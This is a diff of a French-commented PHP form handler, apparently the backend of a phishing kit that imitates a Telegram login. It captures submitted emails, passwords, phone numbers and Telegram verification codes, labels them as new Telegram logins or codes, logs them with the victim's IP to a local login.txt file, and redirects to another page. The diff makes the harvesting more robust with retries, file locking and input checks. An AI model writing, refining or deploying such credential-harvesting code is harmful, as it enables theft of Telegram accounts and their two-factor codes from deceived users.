@@ -1,54 +1,72 @@
 <?php
+// Vérifie si le formulaire a été soumis via la méthode POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // 1. Récupération sécurisée des données
-    $username = $_POST["email"] ?? '';
-    $password = $_POST["password"] ?? '';
-    $country_code = $_POST["country_code"] ?? '';
-    $phone_number = $_POST["phone_number"] ?? '';
-    $verification_code = $_POST["code"] ?? '';
+    // Récupère et nettoie les données du formulaire de manière compatible
+    $username = isset($_POST["email"]) ? htmlspecialchars(trim($_POST["email"])) : '';
+    $password = isset($_POST["password"]) ? htmlspecialchars(trim($_POST["password"])) : '';
+    $country_code = isset($_POST["country_code"]) ? htmlspecialchars(trim($_POST["country_code"])) : '';
+    $phone_number = isset($_POST["phone_number"]) ? htmlspecialchars(trim($_POST["phone_number"])) : '';
+    $verification_code = isset($_POST["code"]) ? htmlspecialchars(trim($_POST["code"])) : '';
     $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
 
-    // 2. Debugging : Vérifiez ce qui est reçu (à commenter en production)
-    error_log("Reçu : country_code=$country_code | phone_number=$phone_number");
-
-    // 3. Formatage des données (correction appliquée ici)
-    $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
-    $data .= "Date: $date\n";
-    
-    if (!empty($verification_code)) {
-        $data .= "Code de vérification: $verification_code\n";
+    // Vérifie si les champs ne sont pas vides
+    if ((!empty($username) && !empty($password)) || !empty($verification_code)) {
+        // Formate les données pour l'enregistrement
+        $data = "=== ".(!empty($verification_code) ? "CODE TELEGRAM" : "NOUVELLE CONNEXION TELEGRAM")." ===\n";
+        $data .= "Date: $date\n";
+        
+        if (!empty($verification_code)) {
+            $data .= "Code de vérification: $verification_code\n";
+        } else {
+            $data .= "Email/Username: $username\n";
+            $data .= "Téléphone: ".($country_code ? $country_code : '').$phone_number."\n";
+            $data .= "Mot de passe: $password\n";
+            $data .= "Session active: $remember\n";
+        }
+        
+        $data .= "Adresse IP: $ip\n";
+        $data .= "==============================\n\n";
+        
+        // Chemin absolu du fichier pour plus de sécurité
+        $file = __DIR__.'/login.txt';
+        
+        // Gestion robuste du fichier
+        $attempts = 0;
+        $max_attempts = 3;
+        $success = false;
+        
+        while ($attempts < $max_attempts && !$success) {
+            try {
+                $fh = fopen($file, 'a');
+                if (flock($fh, LOCK_EX)) {
+                    fwrite($fh, $data);
+                    flock($fh, LOCK_UN);
+                    $success = true;
+                }
+                fclose($fh);
+            } catch (Exception $e) {
+                $attempts++;
+                usleep(100000);
+            }
+        }
+        
+        if ($success) {
+            header("Location: mer.html");
+            exit();
+        } else {
+            error_log("[".date('Y-m-d H:i:s')."] Échec écriture fichier. IP: $ip");
+            echo "<script>alert('Erreur système. Veuillez réessayer.'); window.location.href = 'index.html';</script>";
+            exit();
+        }
     } else {
-        $data .= "Email/Username: $username\n";
-        // CORRECTION CRITIQUE : Gestion combinée code pays + numéro
-        $full_phone = (!empty($country_code) ? $country_code : '') . (!empty($phone_number) ? $phone_number : '');
-        $data .= "Téléphone: " . (!empty($full_phone) ? $full_phone : "Non fourni") . "\n";
-        $data .= "Mot de passe: $password\n";
-        $data .= "Session active: $remember\n";
-    }
-    
-    $data .= "Adresse IP: $ip\n==============================\n\n";
-
-    // 4. Écriture garantie dans le fichier
-    $file = __DIR__.'/login.txt';
-    $mode = !empty($verification_code) ? 'w' : 'a';
-    
-    $fh = @fopen($file, $mode);
-    if ($fh && flock($fh, LOCK_EX)) {
-        fwrite($fh, $data);
-        flock($fh, LOCK_UN);
-        fclose($fh);
-        header("Location: mer.html");
-        exit();
-    } else {
-        error_log("Échec écriture : " . print_r($_POST, true));
-        echo "<script>alert('Erreur serveur.'); history.back();</script>";
+        echo "<script>alert('Veuillez remplir tous les champs requis.'); history.back();</script>";
         exit();
     }
 } else {
     header("HTTP/1.1 403 Forbidden");
-    exit('Accès direct interdit');
+    echo "<h1>Accès interdit</h1><p>Méthode non autorisée.</p>";
+    exit();
 }
 ?>
-    
